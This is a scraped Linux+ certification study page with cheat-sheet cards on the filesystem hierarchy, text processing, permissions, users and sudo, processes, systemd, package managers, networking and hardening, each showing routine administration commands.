📁Filesystem & NavigationLinux+ • FHS▶
LAYOUT
Filesystem Hierarchy (FHS)
Everything hangs off / (root). Config in /etc, logs & variable data in /var, users in /home, binaries in /bin and /usr.
FIND
Locating Files
find walks the tree live with rich filters; locate is instant but uses a database (updatedb).
# Logs modified in the last 7 days
find /var/log -name '*.log' -mtime -7
locate sshd_config
PathHolds
/etcSystem & service config
/varLogs, mail, spool, web data
/homeUser home directories
/usrUser programs & libraries
/bin /sbinEssential / admin binaries
/proc /sysKernel & process info (virtual)
/optAdd-on / third-party software
📝File Ops & Text ProcessingLinux+ • CLI▶
FILES
Manage & View
cp / mv / rm / mkdir / touch / ln manage files; cat / less / head / tail view them. tail -f follows a live log.
TEXT
grep, sed, awk & Pipes
Chain small tools with pipes (|) and redirection (> >> 2>&1) to slice text. grep filters, sed edits, awk handles columns.
# Top source IPs hitting 404s
cat access.log | grep ' 404 ' | awk '{print $1}' | sort | uniq -c | sort -rn | head
🔐Permissions & OwnershipLinux+ • Security▶
MODEL
rwx for User / Group / Other
Three triads of read(4)/write(2)/execute(1). chmod sets them numerically or symbolically; chown / chgrp set ownership; umask sets defaults.
# rwxr-xr-x  then add exec for owner, remove write for group
chmod 755 deploy.sh
chmod u+x,g-w report.txt
chown alice:devs report.txt
SPECIAL
SUID / SGID / Sticky
SUID (4000) runs as the file owner — a classic privesc target. SGID (2000) inherits group. Sticky (1000) on /tmp lets only owners delete their files.
OctalSymbolicMeaning
7rwxRead, write, execute
6rw-Read, write
5r-xRead, execute
4r--Read only
755rwxr-xr-xCommon for scripts/dirs
644rw-r--r--Common for files
👤Users, Groups & PrivilegeLinux+ • IAM▶
ACCOUNTS
Where Identity Lives
/etc/passwd lists accounts, /etc/shadow stores password hashes (root-only), /etc/group defines groups. Manage with useradd / usermod / passwd.
ELEVATE
sudo vs. su
su switches to another user (needs their password); sudo runs a single command with elevated rights per /etc/sudoers (use visudo to edit safely).
FilePurpose
/etc/passwdUser accounts (no passwords)
/etc/shadowHashed passwords (root-only)
/etc/groupGroup memberships
/etc/sudoersWho may run what as whom
⚙️Processes & ServicesLinux+ • A+▶
PROCESSES
Inspect & Signal
ps / top / htop show running processes. kill sends signals: SIGTERM(15) asks nicely, SIGKILL(9) forces. nohup / & / bg / fg manage jobs.
# Find and stop a process
ps aux | grep nginx
kill -15 1337    # graceful
kill -9 1337     # force
SERVICES
systemd
systemctl controls services and boot behavior; journalctl reads the systemd log.
systemctl status sshd
systemctl enable --now nginx
journalctl -u sshd -n 50 --no-pager
SignalNumberEffect
SIGHUP1Reload config
SIGINT2Interrupt (Ctrl+C)
SIGKILL9Force kill (uncatchable)
SIGTERM15Graceful terminate (default)
SIGSTOP19Pause process
📦Package ManagementLinux+ • Distros▶
WHY
Packages & Repos
Package managers resolve dependencies and pull signed software from repositories. The tool depends on the distro family.
FamilyManagerInstall / Update
Debian / Ubuntuapt, dpkgapt install / apt update && apt upgrade
RHEL / Fedoradnf, yum, rpmdnf install / dnf upgrade

Universalsnap, flatpaksnap install / flatpak install
🌐Networking (CLI)Linux+ • Net▶
INSPECT
Interfaces & Sockets
ip replaces ifconfig for addresses and routes; ss (or netstat) lists listening ports and connections.
ip a            # addresses
ss -tulpn       # listening TCP/UDP + PID
ip route
CONNECT
Transfer & Remote
curl / wget fetch URLs; ssh / scp / rsync handle remote shells and sync. Firewall via ufw, firewalld, or raw iptables/nftables.
ssh -i key.pem user@10.0.0.5
rsync -avz ./site/ user@host:/var/www/
curl -sI https://example.com
🛡️Shell, Cron & HardeningLinux+ • SecOps▶
SHELL
Bash Environment
Variables and PATH live in the shell; persistent settings go in ~/.bashrc or /etc/profile. export makes a variable available to child processes.
SCHEDULE
cron & systemd timers
crontab -e schedules recurring jobs; at runs one-off jobs; systemd timers are the modern alternative with logging.
# min hr dom mon dow   command
0 2 * * *   /usr/bin/backup.sh    # 02:00 every day
*/15 * * * * /usr/bin/healthcheck  # every 15 min
HARDEN
Baseline Hardening
Use SSH keys (disable password & root login), keep patched, run fail2ban, and enforce MAC with SELinux or AppArmor. Watch /var/log for anomalies.
Cron FieldRange
Minute0–59
Hour0–23
Day of month1–31
Month1–12
Day of week0–6 (Sun=0)
🧒Linux for NewcomersLinux+ • Start Here▶
BIG IDEA
What Is an Operating System?
